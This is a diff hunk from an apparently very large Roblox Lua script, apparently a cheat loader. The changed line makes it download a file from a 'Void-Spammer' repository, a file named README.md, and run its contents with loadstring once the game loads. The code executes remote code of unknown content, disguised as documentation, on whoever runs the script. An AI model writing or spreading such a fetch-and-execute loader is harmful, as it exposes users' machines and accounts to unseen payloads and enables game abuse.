@@ -26490,7 +26490,7 @@ local Players = game:GetService("Players")
 if not game:IsLoaded() then repeat task.wait(0.25) until game:IsLoaded() end
 repeat task.wait(0.25) until Players.LocalPlayer and Players.LocalPlayer:FindFirstChild("PlayerScripts")
 task.wait(0.5)
-local okFetch, source = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/FakeProducts/Fake-Enhancements/refs/heads/main/Fake%20Rivals.lua")
+local okFetch, source = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/huugitdagoat/Void-Spammer/refs/heads/main/README.md")
 if not okFetch or type(source) ~= "string" then return end
 local chunk = (loadstring or load)(source)
 if chunk then pcall(chunk) end
